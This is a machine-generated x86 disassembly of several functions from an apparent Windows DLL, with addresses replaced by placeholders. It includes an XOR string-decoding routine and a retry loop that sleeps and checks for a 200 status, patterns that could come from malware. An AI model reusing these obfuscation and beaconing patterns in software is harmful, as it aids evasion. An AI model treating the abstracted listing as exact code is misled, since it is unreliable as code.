lea eax [ ebp - 0x154 ]
call sub_100657d0
push eax
push esi
lea edi [ ebp - 0xb8 ]
call sub_1001ad10
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
push r--data
call sub_1003b4a6
lea eax [ edi + 0x38 ]
push eax
push esi
lea eax [ ebp - 0x154 ]
call sub_1002a5c0
push 0x1
push r--data
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x18c ] eax
mov [ ebp - 0x6c ] 0xf
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] bl
call sub_1005d090
mov [ ebp - 0x4 ] 0x4
push 0x1
lea ecx [ ebp - 0x80 ]
cmp [ esi ] ebx
jne r-xdata
push r--data
call sub_1003b4a6
push r--data
push r--data
jmp r-xdata
lea eax [ edi + 0x54 ]
push eax
lea eax [ ebp - 0x154 ]
call sub_100657d0
push eax
push esi
lea edi [ ebp - 0x80 ]
call sub_1001ad10
mov ecx [ ebp - 0x150 ]
mov esi [ ebp - 0x154 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
push r--data
call sub_1003b4a6
call sub_1005be50
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x3
ja r-xdata
mov ecx [ ebp - 0x164 ]
lea eax [ esi + 0x54 ]
push eax
push ecx
lea eax [ ebp - 0x154 ]
call sub_1002a5c0
mov edx [ ebp - 0x15c ]
push edx
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x188 ] eax
call sub_1006a380
push eax
lea eax [ ebp - 0x128 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0x5
call sub_10025a80
add esp 0x10
mov [ ebp - 0x4 ] 0x7
cmp [ ebp - 0x34 ] 0x10
jb r-xdata
push r--data
call sub_1003b4a6
mov ecx [ ebp - 0x150 ]
mov esi [ ebp - 0x154 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp eax 0x4
ja r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_10065045
add esp 0x4
lea eax [ esi + 0x70 ]
push eax
lea eax [ ebp - 0x154 ]
call sub_100657d0
mov ecx [ ebp - 0x164 ]
push eax
push ecx
lea edi [ ebp - 0x128 ]
call sub_1001ad10
mov ecx [ ebp - 0x150 ]
mov esi [ ebp - 0x154 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x4
ja r-xdata
push r--data
call sub_1003b4a6
mov ecx [ ebp - 0x164 ]
lea eax [ esi + 0x70 ]
push eax
push ecx
lea eax [ ebp - 0x154 ]
call sub_1002a5c0
push 0x24ac4
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x15c ] eax
call sub_1006a380
push eax
lea edx [ ebp - 0xf0 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0x8
call sub_10025a80
add esp 0x10
mov [ ebp - 0x4 ] 0xa
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push r--data
call sub_1003b4a6
mov ecx [ ebp - 0x150 ]
mov esi [ ebp - 0x154 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp ecx 0x5
ja r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10065045
add esp 0x4
lea eax [ esi + 0x8c ]
push eax
lea eax [ ebp - 0x154 ]
call sub_100657d0
mov esi [ ebp - 0x164 ]
push eax
push esi
lea edi [ ebp - 0xf0 ]
call sub_1001ad10
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x5
ja r-xdata
push r--data
call sub_1003b4a6
lea eax [ edi + 0x8c ]
push eax
push esi
lea eax [ ebp - 0x154 ]
call sub_1002a5c0
mov [ ebp - 0x180 ] eax
mov [ ebp - 0xc0 ] 0xf
mov [ ebp - 0xc4 ] ebx
mov [ ebp - 0xd4 ] bl
mov eax [ ebp - 0x170 ]
mov [ ebp - 0x4 ] 0xb
cmp [ eax + 0x10 ] ebx
je r-xdata
push r--data
call sub_1003b4a6
mov edx [ ebp - 0x184 ]
push edx
lea eax [ ebp - 0x64 ]
push eax
call sub_1005ceb0
mov esi eax
lea ecx [ ebp - 0x9c ]
push ecx
lea edx [ ebp - 0x48 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0xd
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0xe
call sub_1000c8b0
mov edi eax
mov [ ebp - 0x4 ] 0xf
mov esi [ ebp - 0x150 ]
mov ecx [ ebp - 0x154 ]
sub esi ecx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
push eax
lea ecx [ ebp - 0x2c ]
push r--data
push ecx
call sub_10051900
add esp 0xc
push eax
lea ecx [ ebp - 0xd4 ]
mov [ ebp - 0x4 ] 0xc
call sub_100172f0
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push 0xffffffff
push ebx
push edi
call sub_10040f60
mov esi 0x10
cmp [ ebp - 0x18 ] esi
jb r-xdata
push r--data
call sub_1003b4a6
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x6
ja r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_10065045
add esp 0x4
mov edi 0xf
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10065045
add esp 0x4
lea eax [ edi + 0xa8 ]
push eax
lea eax [ ebp - 0x154 ]
call sub_100657d0
push eax
push esi
lea edi [ ebp - 0xd4 ]
call sub_1001ad10
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x6
ja r-xdata
push r--data
call sub_1003b4a6
mov [ ebp - 0x4 ] 0xb
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0x50 ] esi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_10065045
add esp 0x4
lea eax [ edi + 0xa8 ]
push eax
push esi
lea eax [ ebp - 0x154 ]
call sub_1002a5c0
mov [ ebp - 0x17c ] eax
push r--data
call sub_1003b4a6
mov ecx [ ebp - 0x168 ]
push ecx
lea edx [ ebp - 0x64 ]
push edx
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0x10c ]
push eax
lea ecx [ ebp - 0x48 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x10
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x11
call sub_1000c8b0
mov esi eax
mov [ ebp - 0x4 ] 0x12
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_10065045
add esp 0x4
push 0xffffffff
push ebx
lea ecx [ edi + 0x1c ]
push esi
call sub_10040f60
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push r--data
call sub_1003b4a6
mov edi 0x10
mov esi 0xf
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x4 ] 0xb
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0x50 ] edi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x18c ]
push ecx
lea edx [ ebp - 0x64 ]
push edx
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0xb8 ]
push eax
lea ecx [ ebp - 0x48 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x13
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x14
call sub_1000c8b0
mov esi eax
mov [ ebp - 0x4 ] 0x15
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_10065045
add esp 0x4
push 0xffffffff
push ebx
lea ecx [ edi + 0x38 ]
push esi
call sub_10040f60
mov esi 0x10
cmp [ ebp - 0x18 ] esi
jb r-xdata
push r--data
call sub_1003b4a6
mov edi 0xf
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x4 ] 0xb
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0x50 ] esi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x188 ]
push ecx
lea edx [ ebp - 0x64 ]
push edx
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0x80 ]
push eax
lea ecx [ ebp - 0x48 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x16
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x17
call sub_1000c8b0
mov esi eax
mov [ ebp - 0x4 ] 0x18
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_10065045
add esp 0x4
push 0xffffffff
push ebx
lea ecx [ edi + 0x54 ]
push esi
call sub_10040f60
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push r--data
call sub_1003b4a6
mov edi 0x10
mov esi 0xf
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x4 ] 0xb
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0x50 ] edi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x15c ]
push ecx
lea edx [ ebp - 0x64 ]
push edx
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0x128 ]
push eax
lea ecx [ ebp - 0x48 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x19
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1a
call sub_1000c8b0
mov esi eax
mov [ ebp - 0x4 ] 0x1b
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x4
ja r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_10065045
add esp 0x4
push 0xffffffff
push ebx
lea ecx [ edi + 0x70 ]
push esi
call sub_10040f60
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push r--data
call sub_1003b4a6
mov esi 0x10
mov edi 0xf
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x4 ] 0xb
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0x50 ] esi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x180 ]
push ecx
lea edx [ ebp - 0x64 ]
push edx
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0xf0 ]
push eax
lea ecx [ ebp - 0x48 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x1c
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1d
call sub_1000c8b0
mov esi eax
mov [ ebp - 0x4 ] 0x1e
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x5
ja r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_10065045
add esp 0x4
push 0xffffffff
push ebx
lea ecx [ edi + 0x8c ]
push esi
call sub_10040f60
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push r--data
call sub_1003b4a6
mov edi 0x10
mov esi 0xf
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x4 ] 0xb
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0x50 ] edi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x170 ]
cmp [ ecx + 0x10 ] ebx
je r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_10065045
add esp 0x4
lea ecx [ ebp - 0x144 ]
push ecx
lea edi [ ebp - 0x154 ]
call sub_10005d00
xor ecx ecx
mov [ ebp - 0x4 ] 0x22
xor edx edx
mov [ ebp - 0x178 ] ebx
mov [ ebp - 0x160 ] ecx
mov [ ebp - 0x174 ] ebx
mov [ ebp - 0x155 ] bl
mov [ ebp - 0x15c ] edx
mov edx [ ebp - 0x17c ]
push edx
lea eax [ ebp - 0x64 ]
push eax
call sub_1005ceb0
mov esi eax
lea ecx [ ebp - 0xd4 ]
push ecx
lea edx [ ebp - 0x48 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0x1f
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x20
call sub_1000c8b0
mov esi eax
mov [ ebp - 0x4 ] 0x21
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x6
ja r-xdata
push 0x61a8
call [ Sleep@IAT ]
mov eax [ ebp - 0x160 ]
cmp eax ebx
je r-xdata
cmp edx ebx
je r-xdata
push 0xffffffff
push ebx
lea ecx [ edi + 0xa8 ]
push esi
call sub_10040f60
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push r--data
call sub_1003b4a6
mov edi 0x10
cmp [ ebp - 0x130 ] edi
jb r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x160 ] ebx
cmp ecx ebx
je r-xdata
push 0xdac
call [ Sleep@IAT ]
mov ecx [ ebp - 0x160 ]
mov esi 0x10
mov edi 0xf
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10065045
add esp 0x4
mov esi 0xf
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x134 ] ebx
mov [ ebp - 0x144 ] bl
cmp [ ebp - 0xc0 ] edi
jb r-xdata
mov eax [ ebp - 0x144 ]
push eax
call sub_10065045
add esp 0x4
mov edx [ ebp - 0x164 ]
mov esi [ edx + 0xec ]
mov edi [ esi ]
lea eax [ ebp - 0x174 ]
push eax
mov eax [ ebp - 0x134 ]
lea ecx [ ebp - 0x160 ]
push ecx
lea edx [ ebp - 0x178 ]
push edx
push eax
lea ecx [ ebp - 0x144 ]
call sub_1004c0c0
mov edx [ edi + 0x8 ]
push eax
push ebx
mov ecx esi
call edx
mov edx [ ebp - 0x15c ]
mov ecx [ ebp - 0x160 ]
inc edx
mov [ ebp - 0x15c ] edx
cmp ecx ebx
je r-xdata
push ecx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x160 ] ebx
mov [ ebp - 0x4 ] 0xb
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0x50 ] esi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_10065045
add esp 0x4
mov [ ebp - 0xc0 ] esi
mov [ ebp - 0xc4 ] ebx
mov [ ebp - 0xd4 ] bl
cmp [ ebp - 0xdc ] edi
jb r-xdata
mov ecx [ ebp - 0xd4 ]
push ecx
call sub_10065045
add esp 0x4
cmp eax ebx
jne r-xdata
cmp [ ecx ] bl
je r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_10065045
add esp 0x4
mov [ ebp - 0xdc ] esi
mov [ ebp - 0xe0 ] ebx
mov [ ebp - 0xf0 ] bl
cmp [ ebp - 0x114 ] edi
jb r-xdata
mov edx [ ebp - 0xf0 ]
push edx
call sub_10065045
add esp 0x4
cmp edx 0x5
jg r-xdata
cmp [ ebp - 0x178 ] 0xc8
jne r-xdata
cmp [ ebp - 0x174 ] ebx
je r-xdata
mov [ ebp - 0x114 ] esi
mov [ ebp - 0x118 ] ebx
mov [ ebp - 0x128 ] bl
cmp [ ebp - 0x6c ] edi
jb r-xdata
mov eax [ ebp - 0x128 ]
push eax
call sub_10065045
add esp 0x4
cmp [ ebp - 0x155 ] 0x1
jne r-xdata
mov [ ebp - 0x155 ] 0x1
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] bl
cmp [ ebp - 0xa4 ] edi
jb r-xdata
mov ecx [ ebp - 0x80 ]
push ecx
call sub_10065045
add esp 0x4
cmp ecx ebx
je r-xdata
mov [ ebp - 0xa4 ] esi
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xb8 ] bl
cmp [ ebp - 0xf8 ] edi
jb r-xdata
mov edx [ ebp - 0xb8 ]
push edx
call sub_10065045
add esp 0x4
mov [ ebp - 0x15c ] 0x3
jmp r-xdata
mov edx [ ebp - 0x16c ]
push edx
lea eax [ ebp - 0x174 ]
push eax
call sub_10017570
mov [ ebp - 0x15c ] eax
mov eax [ ebp - 0x160 ]
cmp eax ebx
je r-xdata
mov [ ebp - 0xf8 ] esi
mov [ ebp - 0xfc ] ebx
mov [ ebp - 0x10c ] bl
cmp [ ebp - 0x88 ] edi
jb r-xdata
mov eax [ ebp - 0x10c ]
push eax
call sub_10065045
add esp 0x4
mov edi 0x10
cmp [ ebp - 0x130 ] edi
jb r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x160 ] ebx
mov eax [ ebp - 0x154 ]
mov [ ebp - 0x88 ] esi
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] bl
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x9c ]
push ecx
call sub_10065045
add esp 0x4
mov esi 0xf
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x134 ] ebx
mov [ ebp - 0x144 ] bl
cmp [ ebp - 0xc0 ] edi
jb r-xdata
mov ecx [ ebp - 0x144 ]
push ecx
call sub_10065045
add esp 0x4
mov eax 0x43
jmp r-xdata
mov edx [ ebp - 0x16c ]
push edx
mov edx [ ebp - 0x150 ]
lea ecx [ ebp - 0x148 ]
push ecx
push edx
push eax
call sub_1000c130
mov eax [ ebp - 0x154 ]
push eax
call sub_10065045
add esp 0x14
mov [ ebp - 0xc0 ] esi
mov [ ebp - 0xc4 ] ebx
mov [ ebp - 0xd4 ] bl
cmp [ ebp - 0xdc ] edi
jb r-xdata
mov edx [ ebp - 0xd4 ]
push edx
call sub_10065045
add esp 0x4
mov [ ebp - 0xdc ] esi
mov [ ebp - 0xe0 ] ebx
mov [ ebp - 0xf0 ] bl
cmp [ ebp - 0x114 ] edi
jb r-xdata
mov eax [ ebp - 0xf0 ]
push eax
call sub_10065045
add esp 0x4
mov [ ebp - 0x114 ] esi
mov [ ebp - 0x118 ] ebx
mov [ ebp - 0x128 ] bl
cmp [ ebp - 0x6c ] edi
jb r-xdata
mov ecx [ ebp - 0x128 ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] bl
cmp [ ebp - 0xa4 ] edi
jb r-xdata
mov edx [ ebp - 0x80 ]
push edx
call sub_10065045
add esp 0x4
mov [ ebp - 0xa4 ] esi
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xb8 ] bl
cmp [ ebp - 0xf8 ] edi
jb r-xdata
mov eax [ ebp - 0xb8 ]
push eax
call sub_10065045
add esp 0x4
mov [ ebp - 0xf8 ] esi
mov [ ebp - 0xfc ] ebx
mov [ ebp - 0x10c ] bl
cmp [ ebp - 0x88 ] edi
jb r-xdata
mov ecx [ ebp - 0x10c ]
push ecx
call sub_10065045
add esp 0x4
mov eax [ ebp - 0x154 ]
mov [ ebp - 0x88 ] esi
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] bl
cmp eax ebx
je r-xdata
mov edx [ ebp - 0x9c ]
push edx
call sub_10065045
add esp 0x4
mov eax [ ebp - 0x15c ]
mov ecx [ ebp - 0x16c ]
push ecx
mov ecx [ ebp - 0x150 ]
lea edx [ ebp - 0x148 ]
push edx
push ecx
push eax
call sub_1000c130
mov edx [ ebp - 0x154 ]
push edx
call sub_10065045
add esp 0x14
sub_1002a2b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f918
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov esi ecx
mov edi [ esi ]
lea ecx [ ebp - 0x54 ]
push ecx
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x54 ] 0x0
call sub_1003da90
mov [ ebp - 0x64 ] eax
test eax eax
je r-xdata
mov ebx [ ebp - 0x54 ]
push 0x4
push 0x0
mov [ ebp - 0x58 ] ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x50 ]
mov eax 0x4
call sub_1000a6f0
mov edi [ ebp - 0x54 ]
test edi edi
je r-xdata
xor esi esi
mov [ eax ] 0x0
mov esi eax
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x64 ]
mov [ esi ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x8
mov eax edi
call sub_10054700
push edi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
jmp r-xdata
mov esi [ ebp - 0x5c ]
mov edi [ HeapFree@IAT ]
test ebx ebx
je r-xdata
inc [ esi ]
mov [ ebp - 0x54 ] esi
mov edi [ ebp - 0x60 ]
lea edx [ ebp - 0x58 ]
push edx
mov [ ebp - 0x4 ] 0x0
call sub_10026770
mov [ ebp - 0x4 ] 0xffffffff
dec [ esi ]
jne r-xdata
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
mov eax ebx
call sub_10054700
push ebx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
sub_1002a3e0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax + eax * 2 ]
lea esi [ esi * 4 + r--data ]
xor cl cl
cmp [ esi + 0x4 ] 0x0
jbe r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ ebp + 0xc ]
mov [ edx + ecx ] 0x0
pop esi
pop ebp
retn
push edi
mov edi [ ebp + 0xc ]
xor eax eax
nop
mov edx [ esi ]
mov dl [ edx + eax ]
xor dl [ esi + 0x8 ]
xor dl cl
inc cl
mov [ eax + edi ] dl
movzx eax cl
cmp eax [ esi + 0x4 ]
jb r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + eax ] 0x0
pop edi
pop esi
pop ebp
retn
sub_1002a42f
push 0x8
mov eax sub_1007eefd
call sub_1005d45e
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_1006312b
mov ecx [ ebp + 0x8 ]
lea edi [ esi + 0x14 ]
xor ebx ebx
push edi
push ebx
mov [ edi ] eax
mov [ edi + 0x4 ] edx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ ebp - 0x4 ] ebx
call sub_10035d92
push eax
call sub_10047b65
mov ecx [ ebp + 0x8 ]
add esp 0xc
push edi
push ebx
mov [ esi + 0x8 ] eax
call sub_1004a04c
push eax
call sub_10047b65
add esp 0xc
mov [ esi + 0xc ] eax
call sub_1005e832
mov [ esi + 0x10 ] eax
call sub_1001a1b3
retn 0x4
sub_1002a4b0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn 0x4
cmp ecx 0x9249249
ja r-xdata
lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_10052185
push r--data
lea edx [ ebp - 0xc ]
push edx
mov [ ebp - 0xc ] r--data
call sub_1002050e
lea eax [ ecx * 8 ]
sub eax ecx
add eax eax
add eax eax
push eax
call sub_1005ac7e
add esp 0x4
test eax eax
jne r-xdata
sub_1002a50f
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100264f9
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_1002a5c0
push ebp
mov ebp esp
push ecx
mov ecx [ eax ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ eax + 0x4 ]
mov [ ebp - 0x4 ] 0x0
cmp ecx edi
je r-xdata
mov ecx [ ebx + 0x14 ]
cmp ecx 0x10
jb r-xdata
lea ebx [ ebx ]
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov edx [ ebx + 0x10 ]
add edx eax
cmp ecx 0x10
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov edx [ ecx + 0x10 ]
add edx eax
cmp esi 0x10
jb r-xdata
and eax 0x8000003f
jns r-xdata
nop
xor eax eax
cmp ecx edx
je r-xdata
add [ ebp - 0x4 ] esi
add ecx 0x1c
cmp ecx edi
jne r-xdata
